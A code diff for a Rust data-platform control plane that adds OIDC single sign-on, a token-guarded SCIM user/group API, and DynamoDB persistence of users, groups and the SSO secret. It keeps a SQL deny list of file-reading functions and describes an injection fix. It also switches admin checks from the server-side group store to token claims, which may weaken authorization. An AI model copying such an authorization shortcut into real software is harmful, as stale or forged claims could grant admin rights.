@@ -8,7 +8,7 @@
 
 use std::collections::HashMap;
 use std::path::PathBuf;
-use std::sync::{Arc, Mutex};
+use std::sync::{Arc, Mutex, RwLock};
 use std::time::{SystemTime, UNIX_EPOCH};
 
 use axum::extract::{Path, Request, State};
@@ -30,6 +30,9 @@ use weft_loom::Engine;
 
 use crate::cloud;
 use crate::cluster_client;
+use crate::oidc::{self, OidcConfig, PendingStore, StoredOidc};
+use crate::scim;
+use openidconnect::core::CoreProviderMetadata;
 use weft_catalog_glue::GlueCatalog;
 
 // ─────────────────────────────────────────── Auth ───────────────────────────────────────────────
@@ -45,8 +48,9 @@ pub struct Claims {
     pub exp: usize,
 }
 
-/// A local user record.
-#[derive(Clone)]
+/// A local/federated user record. `password_hash` is empty for SSO/SCIM-sourced users so the local
+/// bcrypt login path can never match them (bcrypt rejects an empty hash).
+#[derive(Clone, Serialize, Deserialize)]
 struct UserRecord {
     password_hash: String,
     groups: Vec<String>,
@@ -236,6 +240,15 @@ pub struct AppState {
     last_activity: Arc<Mutex<HashMap<String, u64>>>,
     /// Seconds of inactivity before a running cluster is auto-terminated (0 = never).
     idle_secs: u64,
+    /// External-IdP OIDC SSO config. Runtime-mutable by an admin (`/api/admin/sso`); `None` → SSO
+    /// disabled. Seeded from env at startup, then overridden by the persisted DynamoDB blob if any.
+    oidc: Arc<RwLock<Option<OidcConfig>>>,
+    /// In-flight OIDC PKCE/state entries (keyed by the `state` handed to the IdP).
+    oidc_pending: Arc<Mutex<PendingStore>>,
+    /// Discovered OIDC provider metadata, cached after the first `/.well-known` fetch.
+    oidc_meta: Arc<Mutex<Option<CoreProviderMetadata>>>,
+    /// Static bearer token guarding `/scim/*` (from `WEFT_SCIM_TOKEN`). `None` → SCIM disabled.
+    scim_token: Arc<Option<String>>,
 }
 
 impl AppState {
@@ -273,8 +286,9 @@ impl AppState {
         );
         let mut groups = HashMap::new();
         groups.insert("admins".to_string(), vec![username.to_string()]);
+        // The embedded engine holds no local/in-memory data. All tables come from attached
+        // external catalogs (Glue), re-registered from DynamoDB in `load_from_cloud`.
         let engine = Arc::new(Engine::new());
-        seed_sample_data(&engine);
         let ddb_table =
             std::env::var("WEFT_DDB_TABLE").unwrap_or_else(|_| "weft-control-plane".into());
         // Workspace S3 prefix (e.g. s3://bucket/control-plane); notebooks/queries are blobs under it.
@@ -310,8 +324,36 @@ impl AppState {
                 .ok()
                 .and_then(|v| v.parse().ok())
                 .unwrap_or(1800),
+            oidc: Arc::new(RwLock::new(OidcConfig::from_env())),
+            oidc_pending: Arc::new(Mutex::new(PendingStore::default())),
+            oidc_meta: Arc::new(Mutex::new(None)),
+            scim_token: Arc::new(
+                std::env::var("WEFT_SCIM_TOKEN")
+                    .ok()
+                    .filter(|s| !s.is_empty()),
+            ),
         };
         st
+    }
+
+    // ── SSO / SCIM accessors (let the `oidc`/`scim` modules reach private state) ──
+
+    /// The runtime-mutable OIDC SSO config (`None` if SSO is disabled). Readers take a read lock and
+    /// **clone** the config out before any `.await` (never hold the guard across an await point).
+    pub(crate) fn oidc(&self) -> &Arc<RwLock<Option<OidcConfig>>> {
+        &self.oidc
+    }
+    /// The in-flight OIDC PKCE/state store.
+    pub(crate) fn oidc_pending(&self) -> &Arc<Mutex<PendingStore>> {
+        &self.oidc_pending
+    }
+    /// The cached discovered provider metadata.
+    pub(crate) fn oidc_meta(&self) -> &Arc<Mutex<Option<CoreProviderMetadata>>> {
+        &self.oidc_meta
+    }
+    /// The SCIM bearer token (`None` if SCIM is disabled).
+    pub(crate) fn scim_token(&self) -> &Arc<Option<String>> {
+        &self.scim_token
     }
 
     /// Allocate a unique id with the given prefix (e.g. `nb-7`, `q-3`).
@@ -322,7 +364,7 @@ impl AppState {
     }
 
     /// Groups `user` belongs to, resolved from the server-side group store (the source of truth —
-    /// never the JWT body). Used to build the governance identity and to gate admin actions.
+    /// never the JWT body). Used to build the governance identity for the SQL data path.
     pub(crate) fn groups_of(&self, user: &str) -> Vec<String> {
         self.groups
             .lock()
@@ -376,6 +418,148 @@ impl AppState {
         ));
     }
 
+    /// Persist the user store (DynamoDB key `users`). Mirrors `save_connections`; best-effort,
+    /// off the request path. Used by the SSO callback + SCIM provisioning.
+    pub(crate) fn save_users(&self) {
+        let snapshot: HashMap<String, UserRecord> = self.users.lock().unwrap().clone();
+        let body = serde_json::to_string(&snapshot).unwrap_or_default();
+        tokio::spawn(cloud::ddb_put((*self.ddb_table).clone(), "users".into(), body));
+    }
+
+    /// Persist the group store (DynamoDB key `groups`).
+    pub(crate) fn save_groups(&self) {
+        let body = serde_json::to_string(&*self.groups.lock().unwrap()).unwrap_or_default();
+        tokio::spawn(cloud::ddb_put(
+            (*self.ddb_table).clone(),
+            "groups".into(),
+            body,
+        ));
+    }
+
+    /// Persist the current SSO config (DynamoDB key `sso`). Serializes the live [`OidcConfig`] as a
+    /// [`StoredOidc`] blob (secret included — trusted control-plane state), or a disabled marker when
+    /// SSO is off, so the disabled state survives restarts even with env vars still set.
+    pub(crate) fn save_sso(&self) {
+        let stored = match self.oidc.read().unwrap().as_ref() {
+            Some(cfg) => StoredOidc::from(cfg),
+            None => StoredOidc::disabled(),
+        };
+        let body = serde_json::to_string(&stored).unwrap_or_default();
+        tokio::spawn(cloud::ddb_put((*self.ddb_table).clone(), "sso".into(), body));
+    }
+
+    // ── SSO / SCIM store mutations (shared by the `oidc` + `scim` modules) ──
+
+    /// Add `user` to each named group's member list (idempotent).
+    fn add_to_groups(groups: &mut HashMap<String, Vec<String>>, user: &str, names: &[String]) {
+        for g in names {
+            let members = groups.entry(g.clone()).or_default();
+            if !members.iter().any(|m| m == user) {
+                members.push(user.to_string());
+            }
+        }
+    }
+
+    /// Remove `user` from every group's member list.
+    fn remove_from_all_groups(groups: &mut HashMap<String, Vec<String>>, user: &str) {
+        for members in groups.values_mut() {
+            members.retain(|m| m != user);
+        }
+    }
+
+    /// Upsert an SSO/SCIM-federated user: empty password hash (local login can never match), set the
+    /// user's groups to exactly `groups`, and reconcile the group store (add to new groups, drop from
+    /// groups the user no longer belongs to). Returns nothing; caller persists.
+    pub(crate) fn upsert_sso_user(&self, username: &str, groups: &[String]) {
+        {
+            let mut users = self.users.lock().unwrap();
+            users.insert(
+                username.to_string(),
+                UserRecord {
+                    password_hash: String::new(),
+                    groups: groups.to_vec(),
+                },
+            );
+        }
+        let mut g = self.groups.lock().unwrap();
+        // Drop from groups not in the new set, then add to the new set.
+        for (name, members) in g.iter_mut() {
+            if !groups.iter().any(|x| x == name) {
+                members.retain(|m| m != username);
+            }
+        }
+        Self::add_to_groups(&mut g, username, groups);
+    }
+
+    /// SCIM: create/replace a user with exactly `groups`. (Same reconcile as [`Self::upsert_sso_user`].)
+    pub(crate) fn scim_upsert_user(&self, username: &str, groups: &[String]) {
+        self.upsert_sso_user(username, groups);
+    }
+
+    /// SCIM: the user's groups, or `None` if no such user.
+    pub(crate) fn scim_get_user(&self, username: &str) -> Option<Vec<String>> {
+        self.users.lock().unwrap().get(username).map(|u| u.groups.clone())
+    }
+
+    /// SCIM: all users as `(username, groups)`, sorted by username.
+    pub(crate) fn scim_list_users(&self) -> Vec<(String, Vec<String>)> {
+        let users = self.users.lock().unwrap();
+        let mut out: Vec<(String, Vec<String>)> =
+            users.iter().map(|(u, r)| (u.clone(), r.groups.clone())).collect();
+        out.sort_by(|a, b| a.0.cmp(&b.0));
+        out
+    }
+
+    /// SCIM: delete a user and drop it from every group. Returns whether it existed.
+    pub(crate) fn scim_delete_user(&self, username: &str) -> bool {
+        let existed = self.users.lock().unwrap().remove(username).is_some();
+        if existed {
+            Self::remove_from_all_groups(&mut self.groups.lock().unwrap(), username);
+        }
+        existed
+    }
+
+    /// SCIM: create/replace a group's membership (and reflect it into each member's `groups`).
+    pub(crate) fn scim_set_group(&self, name: &str, members: Vec<String>) {
+        self.groups.lock().unwrap().insert(name.to_string(), members.clone());
+        // Reflect membership into the user records: add for members, remove for non-members.
+        let mut users = self.users.lock().unwrap();
+        for (uname, rec) in users.iter_mut() {
+            let should = members.iter().any(|m| m == uname);
+            let has = rec.groups.iter().any(|g| g == name);
+            if should && !has {
+                rec.groups.push(name.to_string());
+            } else if !should && has {
+                rec.groups.retain(|g| g != name);
+            }
+        }
+    }
+
+    /// SCIM: a group's members, or `None` if no such group.
+    pub(crate) fn scim_get_group(&self, name: &str) -> Option<Vec<String>> {
+        self.groups.lock().unwrap().get(name).cloned()
+    }
+
+    /// SCIM: all groups as `(name, members)`, sorted by name.
+    pub(crate) fn scim_list_groups(&self) -> Vec<(String, Vec<String>)> {
+        let groups = self.groups.lock().unwrap();
+        let mut out: Vec<(String, Vec<String>)> =
+            groups.iter().map(|(n, m)| (n.clone(), m.clone())).collect();
+        out.sort_by(|a, b| a.0.cmp(&b.0));
+        out
+    }
+
+    /// SCIM: delete a group (and strip it from each user's `groups`). Returns whether it existed.
+    pub(crate) fn scim_delete_group(&self, name: &str) -> bool {
+        let existed = self.groups.lock().unwrap().remove(name).is_some();
+        if existed {
+            for rec in self.users.lock().unwrap().values_mut() {
+                rec.groups.retain(|g| g != name);
+            }
+        }
+        existed
+    }
+
     fn save_clusters(&self) {
         let snapshot: Vec<Cluster> = self.clusters.lock().unwrap().values().cloned().collect();
         let body = serde_json::to_string(&snapshot).unwrap_or_default();
@@ -418,6 +602,32 @@ impl AppState {
         if let Some(body) = cloud::ddb_get(&self.ddb_table, "clusters").await {
             if let Ok(saved) = serde_json::from_str::<Vec<Cluster>>(&body) {
                 self.adopt_clusters(saved).await;
+            }
+        }
+        // Users + groups (DynamoDB) → SSO/SCIM-provisioned directory. Merged *over* the seeded
+        // break-glass admin (loaded entries win for their keys, but the admin is never dropped).
+        if let Some(body) = cloud::ddb_get(&self.ddb_table, "users").await {
+            if let Ok(saved) = serde_json::from_str::<HashMap<String, UserRecord>>(&body) {
+                let mut users = self.users.lock().unwrap();
+                for (k, v) in saved {
+                    users.insert(k, v);
+                }
+            }
+        }
+        if let Some(body) = cloud::ddb_get(&self.ddb_table, "groups").await {
+            if let Ok(saved) = serde_json::from_str::<HashMap<String, Vec<String>>>(&body) {
+                let mut groups = self.groups.lock().unwrap();
+                for (k, v) in saved {
+                    groups.insert(k, v);
+                }
+            }
+        }
+        // SSO config (DynamoDB key `sso`). If present it wins over the env seed (so an admin's
+        // runtime change — including an explicit *disable* — persists across restarts). Absent →
+        // keep whatever `from_env` seeded at construction (disabled in prod, where env is removed).
+        if let Some(body) = cloud::ddb_get(&self.ddb_table, "sso").await {
+            if let Ok(stored) = serde_json::from_str::<StoredOidc>(&body) {
+                *self.oidc.write().unwrap() = stored.into_config();
             }
         }
     }
@@ -508,7 +718,7 @@ impl AppState {
         format!("cluster-{n}")
     }
 
-    fn issue_token(&self, user: &str, groups: &[String]) -> Option<String> {
+    pub(crate) fn issue_token(&self, user: &str, groups: &[String]) -> Option<String> {
         let exp = now_secs() + TOKEN_TTL_SECS;
         let claims = Claims {
             sub: user.to_string(),
@@ -593,10 +803,40 @@ pub fn app(state: AppState) -> Router {
         .route("/api/admin/users", get(list_users).post(create_user))
         .route("/api/admin/groups", get(list_groups).post(create_group))
         .route(
+            "/api/admin/sso",
+            get(oidc::get_sso).put(oidc::put_sso).delete(oidc::delete_sso),
+        )
+        .route(
             "/api/grants",
             get(list_grants).post(create_grant).delete(revoke_grant),
         )
         .route_layer(from_fn_with_state(state.clone(), auth_mw));
+
+    // SCIM 2.0 provisioning surface, guarded by a static bearer token (WEFT_SCIM_TOKEN).
+    let scim_routes = Router::new()
+        .route(
+            "/scim/v2/Users",
+            get(scim::list_users).post(scim::create_user),
+        )
+        .route(
+            "/scim/v2/Users/:id",
+            get(scim::get_user)
+                .put(scim::put_user)
+                .patch(scim::patch_user)
+                .delete(scim::delete_user),
+        )
+        .route(
+            "/scim/v2/Groups",
+            get(scim::list_groups).post(scim::create_group),
+        )
+        .route(
+            "/scim/v2/Groups/:id",
+            get(scim::get_group)
+                .put(scim::put_group)
+                .patch(scim::patch_group)
+                .delete(scim::delete_group),
+        )
+        .route_layer(from_fn_with_state(state.clone(), scim::scim_guard));
 
     // SPA: serve hashed assets directly; any other path (`/`, `/admin`, `/sql`, refreshes, deep
     // links) returns index.html so the client-side router takes over. This is the robust SPA
@@ -607,7 +847,12 @@ pub fn app(state: AppState) -> Router {
         .route("/healthz", get(healthz))
         .route("/api/auth/login", post(login))
         .route("/api/auth/logout", post(logout))
+        // External-IdP OIDC SSO — all PUBLIC (no Bearer), same group as local login.
+        .route("/api/auth/sso/login", get(oidc::sso_login))
+        .route("/api/auth/callback", get(oidc::callback))
+        .route("/api/auth/config", get(oidc::auth_config))
         .merge(protected)
+        .merge(scim_routes)
         .nest_service("/assets", assets)
         .fallback(spa_index)
         .with_state(state)
@@ -694,7 +939,7 @@ async fn create_cluster(
     Extension(claims): Extension<Claims>,
     Json(body): Json<CreateCluster>,
 ) -> Result<(StatusCode, Json<Cluster>), StatusCode> {
-    crate::authz::require_admin(&st, &claims)?;
+    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
     let id = st.new_id();
     let cluster = Cluster {
         id: id.clone(),
@@ -754,10 +999,8 @@ fn cluster_catalog_conf(st: &AppState, default_region: &str) -> String {
     parts.join(";")
 }
 
-/// Build the EC2 boot script for a cluster instance.
-///
-/// SECURITY: only operator-controlled values (`weft_url`, `region`) are interpolated into the shell.
-/// The attached-catalog config — the only attacker-influenced input — is carried as **inert base64**
+/// Render the EC2 boot script. The operator-controlled `weft_url`/`region` are interpolated directly;
+/// the attached-catalog config — the only attacker-influenced input — is carried as **inert base64**
 /// and decoded into the env var at runtime via a quoted command substitution, so the shell never
 /// re-parses its contents. This removes the user-data injection RCE entirely: even a connection field
 /// that slipped past validation (e.g. a single-quote breakout) is just opaque bytes here, never a
@@ -1190,7 +1433,7 @@ async fn delete_cluster(
     Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> StatusCode {
-    if crate::authz::require_admin(&st, &claims).is_err() {
+    if oidc::require_admin(&claims).is_err() {
         return StatusCode::FORBIDDEN;
     }
     let existed = st.clusters.lock().unwrap().remove(&id).is_some();
@@ -1208,7 +1451,7 @@ async fn start_cluster(
     Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<Cluster>, StatusCode> {
-    crate::authz::require_admin(&st, &claims)?;
+    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
     let exists = st.clusters.lock().unwrap().contains_key(&id);
     if !exists {
         return Err(StatusCode::NOT_FOUND);
@@ -1233,7 +1476,7 @@ async fn stop_cluster(
     Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<Cluster>, StatusCode> {
-    crate::authz::require_admin(&st, &claims)?;
+    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
     let exists = st.clusters.lock().unwrap().contains_key(&id);
     if !exists {
         return Err(StatusCode::NOT_FOUND);
@@ -1324,8 +1567,8 @@ fn sql_error(msg: impl Into<String>) -> SqlResponse {
 /// Conservatively deny SQL that reads files directly (bypassing catalog governance) for governed
 /// (non-admin) sessions: file-scan table functions, `CREATE EXTERNAL TABLE … LOCATION`, and `COPY`.
 /// These have no securable to gate and would otherwise read raw object storage with the engine's
-/// credentials. Defense-in-depth on top of table-reference authorization; the authoritative control
-/// is engine-side (plan Step 4.5). Over-denial is acceptable (safe); the input is the translated SQL.
+/// credentials. Defense-in-depth on top of table-reference authorization; over-denial is acceptable
+/// (safe). The input is the translated SQL.
 fn forbidden_construct(sql: &str) -> Option<&'static str> {
     let s = sql.to_ascii_lowercase();
     for f in ["read_parquet", "read_csv", "read_json", "read_avro", "read_ndjson"] {
@@ -1343,10 +1586,9 @@ fn forbidden_construct(sql: &str) -> Option<&'static str> {
 }
 
 /// A stable, per-principal+cluster Spark Connect session id. Replaces a single hardcoded id shared
-/// by every user (which collided sessions / temp views / caches across principals and is a
-/// prerequisite for per-session engine-side governance). Deterministic across gateway restarts (so a
-/// user keeps their session) and distinct per (user, cluster). FNV-1a avoids a new dependency; the
-/// id is opaque to Spark Connect, formatted UUID-shaped only for familiarity.
+/// by every user (which collided sessions / temp views / caches across principals). Deterministic
+/// across gateway restarts (so a user keeps their session) and distinct per (user, cluster). FNV-1a
+/// avoids a new dependency; the id is opaque to Spark Connect, formatted UUID-shaped for familiarity.
 fn session_id_for(user: &str, cluster: &str) -> String {
     fn fnv1a(seed: u64, data: &[u8]) -> u64 {
         let mut h = seed;
@@ -1373,8 +1615,8 @@ fn session_id_for(user: &str, cluster: &str) -> String {
 /// not `SELECT`. References in the session-scratch default catalog (temp views / ad-hoc registered
 /// tables) are skipped — any governed data they could expose is itself read through a governed
 /// `TableScan` elsewhere in the same plan. Using the optimized plan decorrelates subqueries so their
-/// base scans surface as plan nodes. This is gateway-side *defense-in-depth* (the authoritative
-/// per-identity enforcement is engine-side, Step 4.5); resolution oddities fail closed.
+/// base scans surface as plan nodes. This is gateway-side *defense-in-depth*; resolution oddities
+/// fail closed.
 fn first_unauthorized_table(
     eval: &Evaluator,
     identity: &Identity,
@@ -1411,7 +1653,7 @@ fn first_unauthorized_table(
 /// Connect endpoint (the real data-plane hop); otherwise it runs on the gateway's governed embedded
 /// engine. Governed (non-admin) sessions are authorized against the resolved plan's table scans and
 /// denied direct file reads; cluster routing is fail-closed for non-admins until engine-side
-/// enforcement lands (plan Step 4.5).
+/// enforcement lands.
 async fn run_sql(
     State(st): State<AppState>,
     Extension(claims): Extension<Claims>,
@@ -1419,6 +1661,9 @@ async fn run_sql(
 ) -> Json<SqlResponse> {
     const MAX_ROWS: usize = 1000;
     let is_admin = st.is_admin(&claims.sub);
+    // If a RUNNING cluster is selected, route execution to its Spark Connect endpoint (the real
+    // data-plane hop); otherwise run on the gateway's embedded engine. A non-running selection
+    // falls back to the embedded engine.
     if let Some(cid) = req.cluster_id.as_deref().filter(|s| !s.is_empty()) {
         st.touch(cid); // counts as activity → resets the cluster's idle timer
         let endpoint = {
@@ -1433,9 +1678,8 @@ async fn run_sql(
         };
         if let Some(ep) = endpoint {
             // SECURITY: cluster-routed SQL bypasses the governed embedded engine and reaches a Spark
-            // Connect server that does not yet enforce per-identity governance or authenticate the
-            // gateway (plan Step 4.5). Until then, routing is restricted to admins; non-admins fall
-            // back to the governed embedded engine below.
+            // Connect server that does not yet enforce per-identity governance. Until then, routing
+            // is restricted to admins; non-admins fall back to the governed embedded engine below.
             if !is_admin {
                 return Json(sql_error(
                     "cluster-routed queries are temporarily restricted to admins \
@@ -1577,13 +1821,11 @@ async fn create_user(
     State(st): State<AppState>,
     Extension(claims): Extension<Claims>,
     Json(b): Json<CreateUser>,
-) -> StatusCode {
-    if crate::authz::require_admin(&st, &claims).is_err() {
-        return StatusCode::FORBIDDEN;
-    }
+) -> Result<StatusCode, (StatusCode, String)> {
+    oidc::require_admin(&claims)?;
     let hash = match bcrypt::hash(&b.password, bcrypt::DEFAULT_COST) {
         Ok(h) => h,
-        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR,
+        Err(_) => return Ok(StatusCode::INTERNAL_SERVER_ERROR),
     };
     st.users.lock().unwrap().insert(
         b.username.clone(),
@@ -1600,7 +1842,7 @@ async fn create_user(
             .or_default()
             .push(b.username.clone());
     }
-    StatusCode::CREATED
+    Ok(StatusCode::CREATED)
 }
 
 /// A group as the admin panel lists it.
@@ -1639,12 +1881,10 @@ async fn create_group(
     State(st): State<AppState>,
     Extension(claims): Extension<Claims>,
     Json(b): Json<CreateGroup>,
-) -> StatusCode {
-    if crate::authz::require_admin(&st, &claims).is_err() {
-        return StatusCode::FORBIDDEN;
-    }
+) -> Result<StatusCode, (StatusCode, String)> {
+    oidc::require_admin(&claims)?;
     st.groups.lock().unwrap().insert(b.name, b.members);
-    StatusCode::CREATED
+    Ok(StatusCode::CREATED)
 }
 
 /// A grant as the admin panel exchanges it (Unity-Catalog model, string-typed for the wire).
@@ -1673,8 +1913,7 @@ async fn create_grant(
     Extension(claims): Extension<Claims>,
     Json(d): Json<GrantDto>,
 ) -> Result<StatusCode, (StatusCode, String)> {
-    crate::authz::require_admin(&st, &claims)
-        .map_err(|c| (c, "admin privilege required to manage grants".into()))?;
+    oidc::require_admin(&claims)?;
     let grant = dto_to_grant(&d).map_err(|e| (StatusCode::BAD_REQUEST, e))?;
     let mut grants = st.grants.lock().unwrap();
     if !grants.contains(&grant) {
@@ -1687,16 +1926,14 @@ async fn revoke_grant(
     State(st): State<AppState>,
     Extension(claims): Extension<Claims>,
     Json(d): Json<GrantDto>,
-) -> StatusCode {
-    if crate::authz::require_admin(&st, &claims).is_err() {
-        return StatusCode::FORBIDDEN;
-    }
+) -> Result<StatusCode, (StatusCode, String)> {
+    oidc::require_admin(&claims)?;
     match dto_to_grant(&d) {
         Ok(g) => {
             st.grants.lock().unwrap().retain(|x| x != &g);
-            StatusCode::NO_CONTENT
+            Ok(StatusCode::NO_CONTENT)
         }
-        Err(_) => StatusCode::BAD_REQUEST,
+        Err(_) => Ok(StatusCode::BAD_REQUEST),
     }
 }
 
@@ -1789,7 +2026,7 @@ pub struct ConnectionInfo {
     pub kind: String,
     /// Region (for Glue) — surfaced to the UI for convenience; also present in `options`.
     pub region: Option<String>,
-    /// Full kind-specific options (Glue → `region`; Hive → `uri`). Used to rebuild the
+    /// Full kind-specific options (Glue → `region`/`aws_bin`; Hive → `uri`). Used to rebuild the
     /// provider on restart and to seed a cluster's `spark.sql.catalog.<name>.*` config.
     #[serde(default)]
     pub options: HashMap<String, String>,
@@ -1859,8 +2096,8 @@ fn is_safe_endpoint(s: &str) -> bool {
 /// Validate an external-catalog connection request against a **per-kind typed allowlist**: the name
 /// must be a DNS-1123 label, no forbidden (binary/path/endpoint/command) keys may appear, and every
 /// option key must be known for the kind with a value matching its expected shape. Unknown keys are
-/// rejected, not ignored. Enforced at the builder boundary so it covers the live attach path, SCIM,
-/// and persisted-connection re-registration alike.
+/// rejected, not ignored. Enforced at the builder boundary so it covers the live attach path and
+/// persisted-connection re-registration alike.
 fn validate_connection(
     kind: &str,
     name: &str,
@@ -1942,8 +2179,7 @@ async fn create_connection(
     Extension(claims): Extension<Claims>,
     Json(b): Json<CreateConnection>,
 ) -> Result<StatusCode, (StatusCode, String)> {
-    crate::authz::require_admin(&st, &claims)
-        .map_err(|c| (c, "admin privilege required to attach a catalog".into()))?;
+    oidc::require_admin(&claims)?;
     let provider = build_connection_provider(&b.kind, &b.name, &b.options)
         .map_err(|e| (StatusCode::BAD_REQUEST, e))?;
     st.engine.register_catalog(&b.name, provider);
@@ -1969,8 +2205,7 @@ async fn delete_connection(
     Extension(claims): Extension<Claims>,
     Path(name): Path<String>,
 ) -> Result<StatusCode, (StatusCode, String)> {
-    crate::authz::require_admin(&st, &claims)
-        .map_err(|c| (c, "admin privilege required to detach a catalog".into()))?;
+    oidc::require_admin(&claims)?;
     let removed = {
         let mut conns = st.connections.lock().unwrap();
         let before = conns.len();
@@ -2093,7 +2328,7 @@ async fn create_notebook(
         cells: vec![NotebookCell {
             id: st.new_oid("cell"),
             kind: "sql".into(),
-            source: "SELECT * FROM main.sales.lineitem LIMIT 10".into(),
+            source: "SELECT * FROM glue.clickbench.hits LIMIT 10".into(),
         }],
         updated_at: now_iso(),
         owner: claims.sub.clone(),
@@ -2275,224 +2510,6 @@ async fn delete_query(
     }
 }
 
-// ─────────────────────────────── Catalog: sample data + introspection ───────────────────────────
-
-/// Register a small set of sample tables under `main.sales` so the SQL editor + catalog browser
-/// have real, queryable data out of the box (e.g. `SELECT * FROM main.sales.monthly_revenue`). In
-/// production these come from the user's registered catalogs (local + external HMS/Glue/UC).
-fn seed_sample_data(engine: &Engine) {
-    use weft_loom::arrow::array::{Date32Array, Float64Array, Int64Array, StringArray};
-    use weft_loom::arrow::datatypes::{DataType, Field, Schema};
-    use weft_loom::arrow::record_batch::RecordBatch;
-
-    // 2026-01-01 as days since the Unix epoch (Date32). Orders/lineitems spread over ~4 months.
-    const BASE: i32 = 20454;
-    const N_CUST: i64 = 10;
-    const N_ORD: i64 = 30;
-    let segments = [
-        "BUILDING",
-        "AUTOMOBILE",
-        "MACHINERY",
-        "HOUSEHOLD",
-        "FURNITURE",
-    ];
-    let statuses = ["O", "F", "P"];
-    let prio = ["1-URGENT", "2-HIGH", "3-MEDIUM", "4-NOT SPECIFIED", "5-LOW"];
-    let flags = ["A", "N", "R"];
-
-    // monthly_revenue — a simple roll-up table for quick demos.
-    let revenue = RecordBatch::try_new(
-        Arc::new(Schema::new(vec![
-            Field::new("month", DataType::Utf8, false),
-            Field::new("region", DataType::Utf8, false),
-            Field::new("revenue", DataType::Float64, false),
-        ])),
-        vec![
-            Arc::new(StringArray::from(vec![
-                "2026-01", "2026-01", "2026-02", "2026-02", "2026-03", "2026-03",
-            ])),
-            Arc::new(StringArray::from(vec!["US", "EU", "US", "EU", "US", "EU"])),
-            Arc::new(Float64Array::from(vec![
-                120000.0, 88000.0, 135000.0, 91000.0, 142000.0, 99000.0,
-            ])),
-        ],
-    );
-
-    // customer — TPC-H-shaped.
-    let customer = RecordBatch::try_new(
-        Arc::new(Schema::new(vec![
-            Field::new("c_custkey", DataType::Int64, false),
-            Field::new("c_name", DataType::Utf8, false),
-            Field::new("c_mktsegment", DataType::Utf8, false),
-            Field::new("c_acctbal", DataType::Float64, false),
-            Field::new("c_nationkey", DataType::Int64, false),
-        ])),
-        vec![
-            Arc::new(Int64Array::from((1..=N_CUST).collect::<Vec<_>>())),
-            Arc::new(StringArray::from(
-                (1..=N_CUST)
-                    .map(|i| format!("Customer#{i:03}"))
-                    .collect::<Vec<_>>(),
-            )),
-            Arc::new(StringArray::from(
-                (1..=N_CUST)
-                    .map(|i| segments[(i as usize - 1) % segments.len()].to_string())
-                    .collect::<Vec<_>>(),
-            )),
-            Arc::new(Float64Array::from(
-                (1..=N_CUST)
-                    .map(|i| 1000.0 + i as f64 * 137.5)
-                    .collect::<Vec<_>>(),
-            )),
-            Arc::new(Int64Array::from(
-                (1..=N_CUST).map(|i| i % 5).collect::<Vec<_>>(),
-            )),
-        ],
-    );
-
-    // orders — TPC-H-shaped, with a real Date32 o_orderdate.
-    let orders = RecordBatch::try_new(
-        Arc::new(Schema::new(vec![
-            Field::new("o_orderkey", DataType::Int64, false),
-            Field::new("o_custkey", DataType::Int64, false),
-            Field::new("o_orderstatus", DataType::Utf8, false),
-            Field::new("o_totalprice", DataType::Float64, false),
-            Field::new("o_orderdate", DataType::Date32, false),
-            Field::new("o_orderpriority", DataType::Utf8, false),
-        ])),
-        vec![
-            Arc::new(Int64Array::from((1..=N_ORD).collect::<Vec<_>>())),
-            Arc::new(Int64Array::from(
-                (1..=N_ORD).map(|i| (i % N_CUST) + 1).collect::<Vec<_>>(),
-            )),
-            Arc::new(StringArray::from(
-                (1..=N_ORD)
-                    .map(|i| statuses[i as usize % 3].to_string())
-                    .collect::<Vec<_>>(),
-            )),
-            Arc::new(Float64Array::from(
-                (1..=N_ORD)
-                    .map(|i| 5000.0 + i as f64 * 321.0)
-                    .collect::<Vec<_>>(),
-            )),
-            Arc::new(Date32Array::from(
-                (1..=N_ORD)
-                    .map(|i| BASE + (i as i32 * 13) % 120)
-                    .collect::<Vec<_>>(),
-            )),
-            Arc::new(StringArray::from(
-                (1..=N_ORD)
-                    .map(|i| prio[i as usize % 5].to_string())
-                    .collect::<Vec<_>>(),
-            )),
-        ],
-    );
-
-    // lineitem — TPC-H-shaped, 2–4 lines per order.
-    let (mut lo, mut ll, mut lp, mut lq, mut lep, mut ld, mut lt, mut lf, mut ls) = (
-        Vec::new(),
-        Vec::new(),
-        Vec::new(),
-        Vec::new(),
-        Vec::new(),
-        Vec::new(),
-        Vec::new(),
-        Vec::new(),
-        Vec::new(),
-    );
-    for ok in 1..=N_ORD {
-        for ln in 1..=(2 + ok % 3) {
-            lo.push(ok);
-            ll.push(ln);
-            lp.push((ok * 7 + ln) % 200 + 1);
-            let qty = 5.0 + ((ok + ln) % 40) as f64;
-            lq.push(qty);
-            lep.push(qty * (100.0 + (ok * 3 % 900) as f64));
-            ld.push(((ok + ln) % 10) as f64 / 100.0);
-            lt.push((ok % 8) as f64 / 100.0);
-            lf.push(flags[((ok + ln) as usize) % 3].to_string());
-            ls.push(BASE + (ok as i32 * 13) % 120 + ln as i32 * 2);
-        }
-    }
-    let lineitem = RecordBatch::try_new(
-        Arc::new(Schema::new(vec![
-            Field::new("l_orderkey", DataType::Int64, false),
-            Field::new("l_linenumber", DataType::Int64, false),
-            Field::new("l_partkey", DataType::Int64, false),
-            Field::new("l_quantity", DataType::Float64, false),
-            Field::new("l_extendedprice", DataType::Float64, false),
-            Field::new("l_discount", DataType::Float64, false),
-            Field::new("l_tax", DataType::Float64, false),
-            Field::new("l_returnflag", DataType::Utf8, false),
-            Field::new("l_shipdate", DataType::Date32, false),
-        ])),
-        vec![
-            Arc::new(Int64Array::from(lo)),
-            Arc::new(Int64Array::from(ll)),
-            Arc::new(Int64Array::from(lp)),
-            Arc::new(Float64Array::from(lq)),
-            Arc::new(Float64Array::from(lep)),
-            Arc::new(Float64Array::from(ld)),
-            Arc::new(Float64Array::from(lt)),
-            Arc::new(StringArray::from(lf)),
-            Arc::new(Date32Array::from(ls)),
-        ],
-    );
-
-    for (table, batch) in [
-        ("monthly_revenue", revenue),
-        ("customer", customer),
-        ("orders", orders),
-        ("lineitem", lineitem),
-    ] {
-        match batch {
-            Ok(b) => {
-                if let Err(e) = register_namespaced(engine, "main", "sales", table, b) {
-                    eprintln!("seed {table}: {e}");
-                }
-            }
-            Err(e) => eprintln!("build {table}: {e}"),
-        }
-    }
-}
-
-/// Register `batch` as `catalog.schema.table` in the engine, creating the catalog/schema if needed.
